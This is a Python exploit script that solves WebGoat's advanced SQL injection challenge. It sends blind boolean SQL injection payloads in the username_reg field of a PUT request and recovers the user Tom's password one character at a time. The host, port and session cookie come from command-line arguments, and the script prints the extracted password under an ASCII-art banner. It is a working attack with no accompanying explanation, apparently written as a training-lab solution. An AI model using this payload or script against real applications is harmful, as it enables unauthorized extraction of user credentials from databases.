import requests
from http.cookies import SimpleCookie
import os
import sys

def get_password(session_id, host_addr, host_port):
    tom_password = ''
    password_tmp = ''

    list_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.'
    index = 1

    loop = 1
    while loop == 1:
        for i, char in enumerate(list_chars):
            try:
                req = requests.put(
                    url=f'http://{host_addr}:{host_port}/WebGoat/SqlInjectionAdvanced/challenge',
                    headers={
                        'Connection': 'keep-alive',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest',
                        'User-Agent': 'any',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Origin': f'http://{host_addr}:{host_port}',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Dest': 'empty',
                        'Referer': f'http://{host_addr}:{host_port}/WebGoat/start.mvc',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cookie': f'JSESSIONID={session_id}'
                    },
                    data={
                        'username_reg': f'tom\' AND substring(password,1,{index})=\'{password_tmp}{char}', 
                        'email_reg': 'attacker@here.vn',
                        'password_reg': 'attacker123',
                        'confirm_password_reg': 'attacker123' 
                    },
                    timeout=5
                )
                
                if "User {0}" in req.text:
                    tom_password = f'{tom_password}{char}'
                    password_tmp = tom_password
                    break
                if '.' in char:
                    loop = 0
                    print("""\

 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
 ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
   ░▒▓█▓▒░                                                                                                     
    ░▒▓██▓▒░                                                                                                   
""")

                    print("==============================================================================================================")
                    print(f'==> This is Tom\'s password: {tom_password} <==')
                    break
                    
            except requests.RequestException as e:
                print(f"[Error] Request failed on iteration {index}: {e}")
        index += 1
    return None


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python exploit.py <JSSESSIONID> <TARGET> <PORT>")
    else:
        session_id = sys.argv[1]
        host_addr = sys.argv[2]
        host_port = sys.argv[3]
        get_password(session_id, host_addr, host_port)
